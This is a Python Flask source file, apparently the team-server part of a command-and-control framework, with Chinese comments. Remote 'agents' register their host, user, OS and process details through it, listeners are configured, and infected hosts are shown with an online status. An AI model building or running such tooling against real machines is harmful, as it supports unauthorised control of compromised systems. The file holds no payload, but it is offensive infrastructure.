# app.py
from flask import Flask, request, render_template, jsonify
from DB.targetdb import init_db, register_agent, get_all_agents, init_listeners_table, get_all_listeners,add_listener
from datetime import datetime
from typing import List, Dict, Optional

app = Flask(__name__)

# ======================
# 路由 1：主机上线注册（API）
# ======================
# 在 app.py 的 /register 路由中

RESERVED_ROUTES = {
    '/', '/listen', '/listen/add', '/listen/update/<name>', '/listen/delete/<name>',
    '/register', '/tasks', '/results'  # 根据你的实际路由补充
}




# 在 app.py 或 main.py 中添加
@app.route('/listen')
def listen_page():
    listeners = get_all_listeners()
    return render_template('listen.html', listeners=listeners)

@app.route('/listen/add', methods=['POST'])
def api_add_listener():
    data = request.get_json()
    name = (data.get('name') or '').strip()
    ltype = (data.get('type') or '').lower()
    port = data.get('port')
    url_path = data.get('url_path')  # 可能为 None, "", 或 "/xxx"
    domain = (data.get('domain') or '').strip() or None

    # 如果 url_path 是空字符串，转为 None
    if url_path is not None:
        url_path = url_path.strip()
        if url_path == "":
            url_path = None

    # === 新增：校验并转换 port ===
    if port is None:
        return jsonify({'error': '端口不能为空'}), 400
    try:
        port = int(port)  # ← 关键！转成整数
    except (ValueError, TypeError):
        return jsonify({'error': '端口必须是数字'}), 400

    # 检查是否为保留路由
    if url_path in RESERVED_ROUTES:
        return jsonify({'error': 'url_path must change'}), 400
    # ... 其他校验 ...

    try:
        print(name, ltype, port, url_path, domain)
        print(type(name), type(ltype), type(port), type(url_path), type(domain))
        add_listener(name=name, listener_type=ltype, port=port, url_path=url_path, domain=domain)
        return jsonify({'success': True})
    except ValueError as e:
        return jsonify({'error': str(e)}), 400
    #except Exception as e:
     #   return jsonify({'error': '内部错误'}), 500








@app.route('/register', methods=['POST'])
def api_register():
    data = request.get_json()
    if not data or 'id' not in data:
        return jsonify({"error": "Missing agent ID"}), 400

    agent_id = data['id']
    ip = request.remote_addr

    # 获取可选字段
    hostname = data.get('hostname')
    os_info = data.get('os')
    who = data.get('who')  # 新增
    arch = data.get('arch')  # 新增
    process_name = data.get('process_name')  # 新增

    register_agent(agent_id, ip, hostname, os_info, who, arch, process_name)
    print(f"[+] 主机上线: {agent_id} | IP: {ip} | User: {who}")

    return jsonify({"status": "success", "agent_id": agent_id})

# ======================
# 路由 2：Web 主机列表页面
# ======================
@app.route('/')
def index():
    agents = get_all_agents()

    # 计算在线状态（5分钟内算在线）
    agent_list = []
    for a in agents:
        last_seen = datetime.fromisoformat(a['last_seen'])
        offline_seconds = (datetime.utcnow() - last_seen).total_seconds()
        status = "online" if offline_seconds < 300 else "offline"

        # 计算在线状态（5分钟内算在线）
        try:
            last_seen = datetime.fromisoformat(a['last_seen'])
            offline_seconds = (datetime.utcnow() - last_seen).total_seconds()
            status = "online" if offline_seconds < 300 else "offline"
        except:
            status = "unknown"

        agent_list.append({
            'id': a['id'],
            'ip': a['ip_address'],
            'hostname': a['hostname'],
            'os': a['os'],
            'who': a['who'],  # ✅ 添加
            'arch': a['arch'],  # ✅ 添加
            'process_name': a['process_name'],  # ✅ 添加
            'first_seen': datetime.fromisoformat(a['first_seen']).strftime("%Y-%m-%d %H:%M:%S"),
            'last_seen': datetime.fromisoformat(a['last_seen']).strftime("%Y-%m-%d %H:%M:%S"),
            'status': status
        })

    return render_template('index.html', agents=agent_list)

# ======================
# 启动
# ======================
if __name__ == '__main__':
    init_db()
    init_listeners_table()
    print("✅ 数据库初始化完成")
    print("🚀 启动 TeamServer...")
    print("📡 主机注册接口: POST /register")
    print("🌐 Web 界面: http://localhost:5000")
    #192.168.111.129:5000
    app.run(host='0.0.0.0', port=5000, debug=True)